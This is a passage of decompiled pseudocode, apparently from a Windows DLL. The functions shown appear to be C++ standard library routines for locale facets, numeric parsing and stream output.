    "  v10 = sub_18000D640((unsigned int)v18, (_DWORD)a3, a4, *(_DWORD *)(a5 + 24), (__int64)&v15);",
    "  v11 = v10;",
    "  v14 = HIBYTE(v10);",
    "  if ( v16 )",
    "  {",
    "    v12 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v16 + 16LL))(v16);",
    "    if ( v12 )",
    "      (**v12)(v12, 1);",
    "  }",
    "  if ( v11 >= 0 )",
    "  {",
    "    *a7 = sub_180010B70(v18, &v15, (unsigned int)v11, &v17);",
    "    if ( v15 == v18 || v17 || v14 )",
    "      *a6 = 2;",
    "  }",
    "  else",
    "  {",
    "    *a6 = 2;",
    "    *a7 = 0;",
    "  }",
    "  if ( (unsigned __int8)sub_18000E050(a3, a4) )",
    "    *a6 |= 1u;",
    "  *a2 = *a3;",
    "  return a2;",
    "}",
    "",
    "",
    "_OWORD *__fastcall sub_18000BA40(__int64 a1, _OWORD *a2, _OWORD *a3, __int64 a4, __int64 a5, _DWORD *a6, _QWORD *a7)",
    "{",
    "  __int16 v10; // ax",
    "  char v11; // bl",
    "  void (__fastcall ***v12)(_QWORD, __int64); // rax",
    "  char v14; // [rsp+31h] [rbp-77h]",
    "  _BYTE *v15; // [rsp+38h] [rbp-70h] BYREF",
    "  __int64 v16; // [rsp+40h] [rbp-68h]",
    "  int v17; // [rsp+48h] [rbp-60h] BYREF",
    "  _BYTE v18[32]; // [rsp+50h] [rbp-58h] BYREF",
    "",
    "  v16 = *(_QWORD *)(*(_QWORD *)(a5 + 64) + 8LL);",
    "  (*(void (**)(void))(*(_QWORD *)v16 + 8LL))();",
    "  v10 = sub_18000D640((unsigned int)v18, (_DWORD)a3, a4, *(_DWORD *)(a5 + 24), (__int64)&v15);",
    "  v11 = v10;",
    "  v14 = HIBYTE(v10);",
    "  if ( v16 )",
    "  {",
    "    v12 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v16 + 16LL))(v16);",
    "    if ( v12 )",
    "      (**v12)(v12, 1);",
    "  }",
    "  if ( v11 >= 0 )",
    "  {",
    "    *a7 = sub_180010D54(v18, &v15, (unsigned int)v11, &v17);",
    "    if ( v15 == v18 || v17 || v14 )",
    "      *a6 = 2;",
    "  }",
    "  else",
    "  {",
    "    *a6 = 2;",
    "    *a7 = 0;",
    "  }",
    "  if ( (unsigned __int8)sub_18000E050(a3, a4) )",
    "    *a6 |= 1u;",
    "  *a2 = *a3;",
    "  return a2;",
    "}",
    "",
    "",
    "_OWORD *__fastcall sub_18000BB70(__int64 a1, _OWORD *a2, _OWORD *a3, __int64 a4, __int64 a5, _DWORD *a6, _DWORD *a7)",
    "{",
    "  __int16 v10; // ax",
    "  char v11; // bl",
    "  void (__fastcall ***v12)(_QWORD, __int64); // rax",
    "  char v14; // [rsp+31h] [rbp-77h]",
    "  _BYTE *v15; // [rsp+38h] [rbp-70h] BYREF",
    "  __int64 v16; // [rsp+40h] [rbp-68h]",
    "  int v17; // [rsp+48h] [rbp-60h] BYREF",
    "  _BYTE v18[32]; // [rsp+50h] [rbp-58h] BYREF",
    "",
    "  v16 = *(_QWORD *)(*(_QWORD *)(a5 + 64) + 8LL);",
    "  (*(void (**)(void))(*(_QWORD *)v16 + 8LL))();",
    "  v10 = sub_18000D640((unsigned int)v18, (_DWORD)a3, a4, *(_DWORD *)(a5 + 24), (__int64)&v15);",
    "  v11 = v10;",
    "  v14 = HIBYTE(v10);",
    "  if ( v16 )",
    "  {",
    "    v12 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v16 + 16LL))(v16);",
    "    if ( v12 )",
    "      (**v12)(v12, 1);",
    "  }",
    "  if ( v11 >= 0 )",
    "  {",
    "    *a7 = sub_180010E54(v18, &v15, (unsigned int)v11, &v17);",
    "    if ( v15 == v18 || v17 || v14 )",
    "      *a6 = 2;",
    "  }",
    "  else",
    "  {",
    "    *a6 = 2;",
    "    *a7 = 0;",
    "  }",
    "  if ( (unsigned __int8)sub_18000E050(a3, a4) )",
    "    *a6 |= 1u;",
    "  *a2 = *a3;",
    "  return a2;",
    "}",
    "",
    "",
    "_OWORD *__fastcall sub_18000BCA0(__int64 a1, _OWORD *a2, _OWORD *a3, __int64 a4, __int64 a5, _DWORD *a6, _DWORD *a7)",
    "{",
    "  __int16 v10; // ax",
    "  char v11; // bl",
    "  void (__fastcall ***v12)(_QWORD, __int64); // rax",
    "  char v14; // [rsp+31h] [rbp-77h]",
    "  _BYTE *v15; // [rsp+38h] [rbp-70h] BYREF",
    "  __int64 v16; // [rsp+40h] [rbp-68h]",
    "  int v17; // [rsp+48h] [rbp-60h] BYREF",
    "  _BYTE v18[32]; // [rsp+50h] [rbp-58h] BYREF",
    "",
    "  v16 = *(_QWORD *)(*(_QWORD *)(a5 + 64) + 8LL);",
    "  (*(void (**)(void))(*(_QWORD *)v16 + 8LL))();",
    "  v10 = sub_18000D640((unsigned int)v18, (_DWORD)a3, a4, *(_DWORD *)(a5 + 24), (__int64)&v15);",
    "  v11 = v10;",
    "  v14 = HIBYTE(v10);",
    "  if ( v16 )",
    "  {",
    "    v12 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v16 + 16LL))(v16);",
    "    if ( v12 )",
    "      (**v12)(v12, 1);",
    "  }",
    "  if ( v11 >= 0 )",
    "  {",
    "    *a7 = sub_180011030(v18, &v15, (unsigned int)v11, &v17);",
    "    if ( v15 == v18 || v17 || v14 )",
    "      *a6 = 2;",
    "  }",
    "  else",
    "  {",
    "    *a6 = 2;",
    "    *a7 = 0;",
    "  }",
    "  if ( (unsigned __int8)sub_18000E050(a3, a4) )",
    "    *a6 |= 1u;",
    "  *a2 = *a3;",
    "  return a2;",
    "}",
    "",
    "",
    "_OWORD *__fastcall sub_18000BDD0(",
    "        __int64 a1,",
    "        _OWORD *a2,",
    "        __int128 *a3,",
    "        __int128 *a4,",
    "        __int64 a5,",
    "        _DWORD *a6,",
    "        _DWORD *a7)",
    "{",
    "  __int16 v8; // ax",
    "  char v9; // bl",
    "  void (__fastcall ***v10)(_QWORD, __int64); // rax",
    "  int v11; // ebx",
    "  char v13; // [rsp+31h] [rbp-87h]",
    "  __int128 v14; // [rsp+40h] [rbp-78h] BYREF",
    "  __int128 v15; // [rsp+50h] [rbp-68h] BYREF",
    "  _BYTE *v16; // [rsp+60h] [rbp-58h] BYREF",
    "  __int64 v17; // [rsp+68h] [rbp-50h]",
    "  int v18; // [rsp+70h] [rbp-48h] BYREF",
    "  _BYTE v19[32]; // [rsp+78h] [rbp-40h] BYREF",
    "",
    "  v15 = *a4;",
    "  v14 = *a3;",
    "  v17 = *(_QWORD *)(*(_QWORD *)(a5 + 64) + 8LL);",
    "  (*(void (**)(void))(*(_QWORD *)v17 + 8LL))();",
    "  v8 = sub_18000D640((unsigned int)v19, (unsigned int)&v14, (unsigned int)&v15, *(_DWORD *)(a5 + 24), (__int64)&v16);",
    "  v9 = v8;",
    "  v13 = HIBYTE(v8);",
    "  if ( v17 )",
    "  {",
    "    v10 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v17 + 16LL))(v17);",
    "    if ( v10 )",
    "      (**v10)(v10, 1);",
    "  }",
    "  if ( v9 < 0 )",
    "  {",
    "    v11 = 0;",
    "LABEL_9:",
    "    *a6 = 2;",
    "    goto LABEL_10;",
    "  }",
    "  v11 = sub_180010E54(v19, &v16, (unsigned int)v9, &v18);",
    "  if ( v16 == v19 || v18 || v13 )",
    "    goto LABEL_9;",
    "LABEL_10:",
    "  if ( (unsigned __int8)sub_18000E050(&v14, &v15) )",
    "    *a6 |= 1u;",
    "  *a7 = v11;",
    "  *a2 = v14;",
    "  return a2;",
    "}",
    "",
    "",
    "_OWORD *__fastcall sub_18000BF10(__int64 a1, _OWORD *a2, _OWORD *a3, __int64 a4, __int64 a5, _DWORD *a6, _WORD *a7)",
    "{",
    "  __int16 v10; // ax",
    "  char v11; // bl",
    "  void (__fastcall ***v12)(_QWORD, __int64); // rax",
    "  bool v13; // r12",
    "  char *v14; // rdi",
    "  unsigned int v15; // eax",
    "  char v17; // [rsp+31h] [rbp-87h]",
    "  char *v18; // [rsp+38h] [rbp-80h] BYREF",
    "  __int64 v19; // [rsp+40h] [rbp-78h]",
    "  int v20; // [rsp+48h] [rbp-70h] BYREF",
    "  char v21; // [rsp+50h] [rbp-68h] BYREF",
    "  char v22; // [rsp+51h] [rbp-67h] BYREF",
    "",
    "  v19 = *(_QWORD *)(*(_QWORD *)(a5 + 64) + 8LL);",
    "  (*(void (**)(void))(*(_QWORD *)v19 + 8LL))();",
    "  v10 = sub_18000D640((unsigned int)&v21, (_DWORD)a3, a4, *(_DWORD *)(a5 + 24), (__int64)&v18);",
    "  v11 = v10;",
    "  v17 = HIBYTE(v10);",
    "  if ( v19 )",
    "  {",
    "    v12 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v19 + 16LL))(v19);",
    "    if ( v12 )",
    "      (**v12)(v12, 1);",
    "  }",
    "  if ( v11 >= 0 )",
    "  {",
    "    v13 = v21 == 45;",
    "    v14 = &v22;",
    "    if ( v21 != 45 )",
    "      v14 = &v21;",
    "    v15 = sub_180010E54(v14, &v18, (unsigned int)v11, &v20);",
    "    *a7 = v15;",
    "    if ( v18 == v14 || v20 || v15 > 0xFFFF )",
    "    {",
    "      *a6 = 2;",
    "      *a7 = -1;",
    "    }",
    "    else if ( v13 )",
    "    {",
    "      *a7 = -(__int16)v15;",
    "    }",
    "    if ( v17 )",
    "      *a6 = 2;",
    "  }",
    "  else",
    "  {",
    "    *a6 = 2;",
    "    *a7 = 0;",
    "  }",
    "  if ( (unsigned __int8)sub_18000E050(a3, a4) )",
    "    *a6 |= 1u;",
    "  *a2 = *a3;",
    "  return a2;",
    "}",
    "",
    "",
    "_OWORD *__fastcall sub_18000C080(__int64 a1, _OWORD *a2, _OWORD *a3, __int64 a4, __int64 a5, _DWORD *a6, bool *a7)",
    "{",
    "  __int64 v10; // rax",
    "  __int64 v11; // rbx",
    "  void (__fastcall ***v12)(_QWORD, __int64); // rax",
    "  _BYTE **v13; // rdx",
    "  unsigned __int64 v14; // rdx",
    "  _BYTE *v15; // rcx",
    "  unsigned __int64 v16; // rcx",
    "  unsigned __int64 *v17; // rax",
    "  _BYTE **v18; // rdx",
    "  unsigned __int64 v19; // rdx",
    "  _BYTE *v20; // rcx",
    "  unsigned __int64 *v21; // r9",
    "  int v22; // eax",
    "  unsigned __int64 v23; // rdx",
    "  unsigned __int64 v24; // rcx",
    "  __int16 v25; // ax",
    "  char v26; // bl",
    "  void (__fastcall ***v27)(_QWORD, __int64); // rax",
    "  unsigned int v28; // ecx",
    "  char v30; // [rsp+31h] [rbp-70h]",
    "  _BYTE *v31; // [rsp+38h] [rbp-69h] BYREF",
    "  __int64 *v32; // [rsp+40h] [rbp-61h]",
    "  unsigned __int64 v33; // [rsp+48h] [rbp-59h]",
    "  unsigned __int64 v34; // [rsp+50h] [rbp-51h]",
    "  int v35; // [rsp+58h] [rbp-49h] BYREF",
    "  unsigned __int64 v36[2]; // [rsp+60h] [rbp-41h] BYREF",
    "  unsigned __int64 v37; // [rsp+70h] [rbp-31h]",
    "  unsigned __int64 v38; // [rsp+78h] [rbp-29h]",
    "  _BYTE v39[32]; // [rsp+80h] [rbp-21h] BYREF",
    "",
    "  v32 = *(__int64 **)(*(_QWORD *)(a5 + 64) + 8LL);",
    "  v10 = *v32;",
    "  if ( (*(_DWORD *)(a5 + 24) & 0x4000) != 0 )",
    "  {",
    "    (*(void (**)(void))(v10 + 8))();",
    "    v11 = sub_18000ABA0((__int64)&v31);",
    "    if ( v32 )",
    "    {",
    "      v12 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64 *))(*v32 + 16))(v32);",
    "      if ( v12 )",
    "        (**v12)(v12, 1);",
    "    }",
    "    sub_180006C20((__int64)v36, 1u, 0);",
    "    (*(void (__fastcall **)(__int64, _BYTE **))(*(_QWORD *)v11 + 48LL))(v11, &v31);",
    "    v13 = &v31;",
    "    if ( v34 > 0xF )",
    "      v13 = (_BYTE **)v31;",
    "    sub_180008910(v36, (__int64)v13, v33);",
    "    if ( v34 > 0xF )",
    "    {",
    "      v14 = v34 + 1;",
    "      v15 = v31;",
    "      if ( v34 + 1 >= 0x1000 )",
    "      {",
    "        v14 = v34 + 40;",
    "        v15 = (_BYTE *)*((_QWORD *)v31 - 1);",
    "        if ( (unsigned __int64)(v31 - v15 - 8) > 0x1F )",
    "          invalid_parameter_noinfo_noreturn();",
    "      }",
    "      sub_1800116E0(v15, v14);",
    "    }",
    "    v16 = v37;",
    "    if ( v37 >= v38 )",
    "    {",
    "      sub_18000AD70(v36, 1u, 0, 0);",
    "    }",
    "    else",
    "    {",
    "      ++v37;",
    "      v17 = v36;",
    "      if ( v38 > 0xF )",
    "        v17 = (unsigned __int64 *)v36[0];",
    "      *(_WORD *)((char *)v17 + v16) = 0;",
    "    }",
    "    (*(void (__fastcall **)(__int64, _BYTE **))(*(_QWORD *)v11 + 56LL))(v11, &v31);",
    "    v18 = &v31;",
    "    if ( v34 > 0xF )",
    "      v18 = (_BYTE **)v31;",
    "    sub_180008910(v36, (__int64)v18, v33);",
    "    if ( v34 > 0xF )",
    "    {",
    "      v19 = v34 + 1;",
    "      v20 = v31;",
    "      if ( v34 + 1 >= 0x1000 )",
    "      {",
    "        v19 = v34 + 40;",
    "        v20 = (_BYTE *)*((_QWORD *)v31 - 1);",
    "        if ( (unsigned __int64)(v31 - v20 - 8) > 0x1F )",
    "          invalid_parameter_noinfo_noreturn();",
    "      }",
    "      sub_1800116E0(v20, v19);",
    "    }",
    "    v21 = v36;",
    "    if ( v38 > 0xF )",
    "      LODWORD(v21) = v36[0];",
    "    v22 = sub_18000F560((_DWORD)a3, a4, 2, (_DWORD)v21, 1);",
    "    if ( v22 )",
    "    {",
    "      if ( v22 == 1 )",
    "      {",
    "        *a7 = 1;",
    "      }",
    "      else",
    "      {",
    "        *a7 = 0;",
    "        *a6 = 2;",
    "      }",
    "    }",
    "    else",
    "    {",
    "      *a7 = 0;",
    "    }",
    "    if ( v38 > 0xF )",
    "    {",
    "      v23 = v38 + 1;",
    "      v24 = v36[0];",
    "      if ( v38 + 1 >= 0x1000 )",
    "      {",
    "        v23 = v38 + 40;",
    "        v24 = *(_QWORD *)(v36[0] - 8);",
    "        if ( v36[0] - v24 - 8 > 0x1F )",
    "          invalid_parameter_noinfo_noreturn();",
    "      }",
    "      sub_1800116E0(v24, v23);",
    "    }",
    "  }",
    "  else",
    "  {",
    "    (*(void (**)(void))(v10 + 8))();",
    "    v25 = sub_18000D640((unsigned int)v39, (_DWORD)a3, a4, *(_DWORD *)(a5 + 24), (__int64)&v31);",
    "    v26 = v25;",
    "    v30 = HIBYTE(v25);",
    "    if ( v32 )",
    "    {",
    "      v27 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64 *))(*v32 + 16))(v32);",
    "      if ( v27 )",
    "        (**v27)(v27, 1);",
    "    }",
    "    if ( v26 >= 0 )",
    "    {",
    "      v28 = sub_180011030(v39, &v31, (unsigned int)v26, &v35);",
    "      if ( v31 == v39 || v35 || v30 )",
    "      {",
    "        *a7 = 1;",
    "      }",
    "      else",
    "      {",
    "        *a7 = v28 != 0;",
    "        if ( v28 <= 1 )",
    "          goto LABEL_45;",
    "      }",
    "    }",
    "    else",
    "    {",
    "      *a7 = 0;",
    "    }",
    "    *a6 = 2;",
    "  }",
    "LABEL_45:",
    "  if ( (unsigned __int8)sub_18000E050(a3, a4) )",
    "    *a6 |= 1u;",
    "  *a2 = *a3;",
    "  return a2;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000C3B0(__int64 *a1, __int64 a2)",
    "{",
    "  __int64 v4; // rbx",
    "  __int64 v5; // rax",
    "  void *v6; // rdi",
    "  _BYTE *v7; // rax",
    "  char *v8; // rax",
    "  char *v9; // rax",
    "  _BYTE v11[8]; // [rsp+20h] [rbp-69h] BYREF",
    "  __int64 v12; // [rsp+28h] [rbp-61h]",
    "  char v13; // [rsp+30h] [rbp-59h]",
    "  __int64 v14; // [rsp+38h] [rbp-51h]",
    "  char v15; // [rsp+40h] [rbp-49h]",
    "  __int64 v16; // [rsp+48h] [rbp-41h]",
    "  __int16 v17; // [rsp+50h] [rbp-39h]",
    "  __int64 v18; // [rsp+58h] [rbp-31h]",
    "  __int16 v19; // [rsp+60h] [rbp-29h]",
    "  __int64 v20; // [rsp+68h] [rbp-21h]",
    "  char v21; // [rsp+70h] [rbp-19h]",
    "  __int64 v22; // [rsp+78h] [rbp-11h]",
    "  char v23; // [rsp+80h] [rbp-9h]",
    "  _BYTE v24[88]; // [rsp+88h] [rbp-1h] BYREF",
    "",
    "  if ( a1 && !*a1 )",
    "  {",
    "    v4 = sub_180011714(48);",
    "    *(_OWORD *)v4 = 0;",
    "    *(_OWORD *)(v4 + 16) = 0;",
    "    *(_OWORD *)(v4 + 32) = 0;",
    "    v5 = *(_QWORD *)(a2 + 8);",
    "    if ( v5 )",
    "    {",
    "      v6 = *(void **)(v5 + 40);",
    "      if ( !v6 )",
    "        v6 = (void *)(v5 + 48);",
    "    }",
    "    else",
    "    {",
    "      v6 = &unk_18004477D;",
    "    }",
    "    sub_18000FC70(v11, 0);",
    "    v12 = 0;",
    "    v13 = 0;",
    "    v14 = 0;",
    "    v15 = 0;",
    "    v16 = 0;",
    "    v17 = 0;",
    "    v18 = 0;",
    "    v19 = 0;",
    "    v20 = 0;",
    "    v21 = 0;",
    "    v22 = 0;",
    "    v23 = 0;",
    "    if ( !v6 )",
    "      sub_18000FFD8(\"bad locale name\");",
    "    sub_180010330(v11, v6);",
    "    *(_DWORD *)(v4 + 8) = 0;",
    "    *(_QWORD *)v4 = &off_18003AA60;",
    "    sub_18001A6FC();",
    "    sub_180010680(v24);",
    "    *(_QWORD *)(v4 + 16) = 0;",
    "    *(_QWORD *)(v4 + 32) = 0;",
    "    *(_QWORD *)(v4 + 40) = 0;",
    "    sub_180010680(v24);",
    "    v7 = (_BYTE *)sub_18001A730(1);",
    "    if ( !v7 )",
    "      Concurrency::cancel_current_task();",
    "    *v7 = 0;",
    "    *(_QWORD *)(v4 + 16) = v7;",
    "    v8 = (char *)sub_18001A730(6);",
    "    if ( !v8 )",
    "      Concurrency::cancel_current_task();",
    "    strcpy(v8, \"false\");",
    "    *(_QWORD *)(v4 + 32) = v8;",
    "    v9 = (char *)sub_18001A730(5);",
    "    if ( !v9 )",
    "      Concurrency::cancel_current_task();",
    "    strcpy(v9, \"true\");",
    "    *(_QWORD *)(v4 + 40) = v9;",
    "    *(_WORD *)(v4 + 24) = 11310;",
    "    *a1 = v4;",
    "    std::_Locinfo::_Locinfo_dtor((struct std::_Locinfo *)v11);",
    "    if ( v22 )",
    "      sub_18001A2CC(v22);",
    "    v22 = 0;",
    "    if ( v20 )",
    "      sub_18001A2CC(v20);",
    "    v20 = 0;",
    "    if ( v18 )",
    "      sub_18001A2CC(v18);",
    "    v18 = 0;",
    "    if ( v16 )",
    "      sub_18001A2CC(v16);",
    "    v16 = 0;",
    "    if ( v14 )",
    "      sub_18001A2CC(v14);",
    "    v14 = 0;",
    "    if ( v12 )",
    "      sub_18001A2CC(v12);",
    "    v12 = 0;",
    "    sub_18000FCE8(v11);",
    "  }",
    "  return 4;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000C5F0(__int64 *a1, __int64 a2)",
    "{",
    "  __int64 v4; // rsi",
    "  __int64 v5; // rcx",
    "  void *v6; // rbx",
    "  _BYTE v8[8]; // [rsp+20h] [rbp-29h] BYREF",
    "  __int64 v9; // [rsp+28h] [rbp-21h]",
    "  char v10; // [rsp+30h] [rbp-19h]",
    "  __int64 v11; // [rsp+38h] [rbp-11h]",
    "  char v12; // [rsp+40h] [rbp-9h]",
    "  __int64 v13; // [rsp+48h] [rbp-1h]",
    "  __int16 v14; // [rsp+50h] [rbp+7h]",
    "  __int64 v15; // [rsp+58h] [rbp+Fh]",
    "  __int16 v16; // [rsp+60h] [rbp+17h]",
    "  __int64 v17; // [rsp+68h] [rbp+1Fh]",
    "  char v18; // [rsp+70h] [rbp+27h]",
    "  __int64 v19; // [rsp+78h] [rbp+2Fh]",
    "  char v20; // [rsp+80h] [rbp+37h]",
    "",
    "  if ( a1 && !*a1 )",
    "  {",
    "    v4 = sub_180011714(16);",
    "    v5 = *(_QWORD *)(a2 + 8);",
    "    if ( v5 )",
    "    {",
    "      v6 = *(void **)(v5 + 40);",
    "      if ( !v6 )",
    "        v6 = (void *)(v5 + 48);",
    "    }",
    "    else",
    "    {",
    "      v6 = &unk_18004477D;",
    "    }",
    "    sub_18000FC70(v8, 0);",
    "    v9 = 0;",
    "    v10 = 0;",
    "    v11 = 0;",
    "    v12 = 0;",
    "    v13 = 0;",
    "    v14 = 0;",
    "    v15 = 0;",
    "    v16 = 0;",
    "    v17 = 0;",
    "    v18 = 0;",
    "    v19 = 0;",
    "    v20 = 0;",
    "    if ( !v6 )",
    "      sub_18000FFD8(\"bad locale name\");",
    "    sub_180010330(v8, v6);",
    "    *(_DWORD *)(v4 + 8) = 0;",
    "    *(_QWORD *)v4 = &MEMORY[0x18003AA00];",
    "    *a1 = v4;",
    "    std::_Locinfo::_Locinfo_dtor((struct std::_Locinfo *)v8);",
    "    if ( v19 )",
    "      sub_18001A2CC(v19);",
    "    v19 = 0;",
    "    if ( v17 )",
    "      sub_18001A2CC(v17);",
    "    v17 = 0;",
    "    if ( v15 )",
    "      sub_18001A2CC(v15);",
    "    v15 = 0;",
    "    if ( v13 )",
    "      sub_18001A2CC(v13);",
    "    v13 = 0;",
    "    if ( v11 )",
    "      sub_18001A2CC(v11);",
    "    v11 = 0;",
    "    if ( v9 )",
    "      sub_18001A2CC(v9);",
    "    v9 = 0;",
    "    sub_18000FCE8(v8);",
    "  }",
    "  return 4;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000C770(__int64 *a1, __int64 a2)",
    "{",
    "  __int64 v4; // rsi",
    "  __int64 v5; // rcx",
    "  void *v6; // rbx",
    "  _BYTE v8[8]; // [rsp+20h] [rbp-29h] BYREF",
    "  __int64 v9; // [rsp+28h] [rbp-21h]",
    "  char v10; // [rsp+30h] [rbp-19h]",
    "  __int64 v11; // [rsp+38h] [rbp-11h]",
    "  char v12; // [rsp+40h] [rbp-9h]",
    "  __int64 v13; // [rsp+48h] [rbp-1h]",
    "  __int16 v14; // [rsp+50h] [rbp+7h]",
    "  __int64 v15; // [rsp+58h] [rbp+Fh]",
    "  __int16 v16; // [rsp+60h] [rbp+17h]",
    "  __int64 v17; // [rsp+68h] [rbp+1Fh]",
    "  char v18; // [rsp+70h] [rbp+27h]",
    "  __int64 v19; // [rsp+78h] [rbp+2Fh]",
    "  char v20; // [rsp+80h] [rbp+37h]",
    "",
    "  if ( a1 && !*a1 )",
    "  {",
    "    v4 = sub_180011714(16);",
    "    v5 = *(_QWORD *)(a2 + 8);",
    "    if ( v5 )",
    "    {",
    "      v6 = *(void **)(v5 + 40);",
    "      if ( !v6 )",
    "        v6 = (void *)(v5 + 48);",
    "    }",
    "    else",
    "    {",
    "      v6 = &unk_18004477D;",
    "    }",
    "    sub_18000FC70(v8, 0);",
    "    v9 = 0;",
    "    v10 = 0;",
    "    v11 = 0;",
    "    v12 = 0;",
    "    v13 = 0;",
    "    v14 = 0;",
    "    v15 = 0;",
    "    v16 = 0;",
    "    v17 = 0;",
    "    v18 = 0;",
    "    v19 = 0;",
    "    v20 = 0;",
    "    if ( !v6 )",
    "      sub_18000FFD8(\"bad locale name\");",
    "    sub_180010330(v8, v6);",
    "    *(_DWORD *)(v4 + 8) = 0;",
    "    *(_QWORD *)v4 = &MEMORY[0x18003A650];",
    "    *a1 = v4;",
    "    std::_Locinfo::_Locinfo_dtor((struct std::_Locinfo *)v8);",
    "    if ( v19 )",
    "      sub_18001A2CC(v19);",
    "    v19 = 0;",
    "    if ( v17 )",
    "      sub_18001A2CC(v17);",
    "    v17 = 0;",
    "    if ( v15 )",
    "      sub_18001A2CC(v15);",
    "    v15 = 0;",
    "    if ( v13 )",
    "      sub_18001A2CC(v13);",
    "    v13 = 0;",
    "    if ( v11 )",
    "      sub_18001A2CC(v11);",
    "    v11 = 0;",
    "    if ( v9 )",
    "      sub_18001A2CC(v9);",
    "    v9 = 0;",
    "    sub_18000FCE8(v8);",
    "  }",
    "  return 2;",
    "}",
    "",
    "",
    "__int64 *__fastcall sub_18000C8F0(__int64 *a1, unsigned __int8 a2, __int64 a3, __int64 a4)",
    "{",
    "  unsigned int v4; // esi",
    "  __int64 v6; // rcx",
    "  __int64 v7; // rcx",
    "  __int64 v8; // rax",
    "  bool v9; // al",
    "  __int64 v10; // rax",
    "  char v11; // dl",
    "  int v12; // r8d",
    "  _QWORD *v13; // rcx",
    "  int *v14; // rdx",
    "  _QWORD *v15; // rcx",
    "  _BYTE *v16; // rdx",
    "  unsigned int v17; // eax",
    "  char *v18; // rcx",
    "  __int64 v19; // r8",
    "  int v20; // edx",
    "  __int64 v21; // rdx",
    "  __int64 v22; // rcx",
    "  const char *v24; // rbx",
    "  __m128i *v25; // rax",
    "  int v26; // [rsp+20h] [rbp-68h]",
    "  bool v27; // [rsp+28h] [rbp-60h]",
    "  _QWORD v28[2]; // [rsp+30h] [rbp-58h] BYREF",
    "  _QWORD pExceptionObject[9]; // [rsp+40h] [rbp-48h] BYREF",
    "",
    "  v4 = a2;",
    "  v26 = (int)a1;",
    "  v6 = *(__int64 *)((char *)a1 + *(int *)(*a1 + 4) + 72);",
    "  if ( v6 )",
    "    (*(void (__fastcall **)(__int64))(*(_QWORD *)v6 + 8LL))(v6);",
    "  v7 = *a1;",
    "  v8 = *(int *)(*a1 + 4);",
    "  if ( *(_DWORD *)((char *)a1 + v8 + 16) )",
    "  {",
    "    v9 = 0;",
    "  }",
    "  else",
    "  {",
    "    v10 = *(__int64 *)((char *)a1 + v8 + 80);",
    "    if ( !v10 || (__int64 *)v10 == a1 )",
    "    {",
    "      v9 = 1;",
    "    }",
    "    else",
    "    {",
    "      sub_180009180(v10);",
    "      v7 = *a1;",
    "      v9 = *(_DWORD *)((char *)a1 + *(int *)(*a1 + 4) + 16) == 0;",
    "    }",
    "  }",
    "  v27 = v9;",
    "  if ( v9 )",
    "  {",
    "    v13 = *(_QWORD **)((char *)a1 + *(int *)(v7 + 4) + 72);",
    "    if ( *(_QWORD *)v13[8] && (v14 = (int *)v13[11], *v14 > 0) )",
    "    {",
    "      --*v14;",
    "      v15 = (_QWORD *)v13[8];",
    "      v16 = (_BYTE *)(*v15)++;",
    "      *v16 = v4;",
    "      v17 = v4;",
    "    }",
    "    else",
    "    {",
    "      v17 = (*(__int64 (__fastcall **)(_QWORD *, _QWORD))(*v13 + 24LL))(v13, v4);",
    "    }",
    "    v12 = 0;",
    "    v11 = 4;",
    "    if ( v17 == -1 )",
    "      v12 = 4;",
    "  }",
    "  else",
    "  {",
    "    v11 = 4;",
    "    v12 = 4;",
    "  }",
    "  v18 = (char *)a1 + *(int *)(*a1 + 4);",
    "  v19 = *((_DWORD *)v18 + 4) | (unsigned int)v12;",
    "  if ( *((_QWORD *)v18 + 9) )",
    "    v11 = 0;",
    "  v20 = ((unsigned __int8)v19 | (unsigned __int8)v11) & 0x17;",
    "  *((_DWORD *)v18 + 4) = v20;",
    "  v21 = *((_DWORD *)v18 + 5) & (unsigned int)v20;",
    "  if ( (_DWORD)v21 )",
    "  {",
    "    if ( (v21 & 4) != 0 )",
    "    {",
    "      v24 = \"ios_base::badbit set\";",
    "    }",
    "    else",
    "    {",
    "      v24 = \"ios_base::failbit set\";",
    "      if ( (v21 & 2) == 0 )",
    "        v24 = \"ios_base::eofbit set\";",
    "    }",
    "    v25 = (__m128i *)unknown_libname_1(v28, 1);",
    "    sub_180001E10(pExceptionObject, (__int64)v24, v25);",
    "    throw (std::ios_base::failure *)pExceptionObject;",
    "  }",
    "  if ( !(unsigned __int8)sub_180010AB0(v18, v21, v19, a4, v26, v27, v28[0], v28[1]) )",
    "    sub_1800092E0(a1);",
    "  v22 = *(__int64 *)((char *)a1 + *(int *)(*a1 + 4) + 72);",
    "  if ( v22 )",
    "    (*(void (__fastcall **)(__int64))(*(_QWORD *)v22 + 16LL))(v22);",
    "  return a1;",
    "}",
    "",
    "",
    "bool __fastcall sub_18000CAA0(__int64 a1, char a2)",
    "{",
    "  __int64 v4; // rcx",
    "  int v5; // edx",
    "  char v6; // al",
    "  int v7; // eax",
    "  int v8; // eax",
    "  __int64 v10; // rcx",
    "  char v11; // r14",
    "  __int64 v12; // rcx",
    "  __int64 v13; // r15",
    "  void (__fastcall ***v14)(_QWORD, __int64); // rax",
    "  __int64 v15; // rcx",
    "  unsigned __int8 *v16; // rdx",
    "  int v17; // eax",
    "  __int64 v18; // rbx",
    "  int *v19; // rcx",
    "  _QWORD *v20; // rax",
    "  _QWORD *v21; // rcx",
    "  unsigned __int8 *v22; // rdx",
    "  unsigned __int8 *v23; // rcx",
    "  __int64 v24; // rcx",
    "  int v25; // eax",
    "  int v26; // eax",
    "  int v27; // eax",
    "  const char *v28; // rbx",
    "  __m128i *v29; // rax",
    "  const char *v30; // rbx",
    "  __m128i *v31; // rax",
    "  _BYTE v32[8]; // [rsp+20h] [rbp-88h] BYREF",
    "  __int64 v33; // [rsp+28h] [rbp-80h]",
